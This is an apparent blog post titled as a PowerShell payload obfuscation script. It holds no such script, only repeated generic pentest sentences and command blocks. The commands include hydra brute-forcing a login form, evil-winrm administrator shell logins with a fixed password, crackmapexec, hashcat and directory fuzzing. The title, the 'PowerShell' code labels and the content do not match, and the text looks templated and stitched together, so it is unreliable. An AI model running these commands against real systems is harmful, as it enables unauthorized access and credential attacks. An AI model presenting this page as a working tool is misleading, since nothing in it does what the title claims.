---
TitleSEO: "Payload Obfuscation Script in PowerShell | ZureFX"
TitlePost: "Payload Obfuscation Script — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for payload obfuscation script. Built for security research and automation."
Keywords: "bash, scanner, rust, go, automation, c, powershell"
URL: "https://zurefx.github.io/scripting/script-payload-obfuscation-script-393.html"
URL_IMAGES: ""
Date: "2025-09-04"
Tags: "Bash, Scanner, Rust, Go, Automation, C, PowerShell"
Section: "scripting"
Lang: "en"
main_img: "script-payload-obfuscation-script-393"
Permalink: "/scripting/script-payload-obfuscation-script-393.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The scheduled task ran with elevated privileges and could be abused for escalation. The kernel version was outdated and vulnerable to a publicly known exploit. Initial enumeration revealed several interesting open ports on the target.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `secretsdump`
- `kerbrute`
- `rubeus`

## Implementation

### Core Logic

The backup files contained sensitive information that should not have been accessible. Authentication bypass was achieved through careful manipulation of the login mechanism.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.127.21.233 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Group Policy Preferences contained encrypted but recoverable credentials. The service was running without proper input validation, leading to injection vulnerabilities.

### Helper Functions

The service account had excessive permissions assigned in Active Directory. Command injection was possible through unsanitized user input in the search functionality.

```powershell
evil-winrm -i 10.38.69.2 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.97.145.125 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.91.96.4 -u administrator -p 'P@ssw0rd!' --shares
```

## Usage

### Basic Usage

Privilege escalation was possible due to misconfigured sudo permissions. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
gobuster dir -u http://10.72.175.177/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
evil-winrm -i 10.35.98.246 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.42.222.40 -u administrator -p 'P@ssw0rd!'
```

### Advanced Options

The service account had excessive permissions assigned in Active Directory. Initial enumeration revealed several interesting open ports on the target. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.36.58.43/FUZZ
evil-winrm -i 10.12.97.51 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.52.139.189 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Output

### Example Output

The backup files contained sensitive information that should not have been accessible. Weak file permissions allowed modification of critical system files.

```
[+] Scanning target...
[+] Found 10 results
[+] Done in 13.26s
```
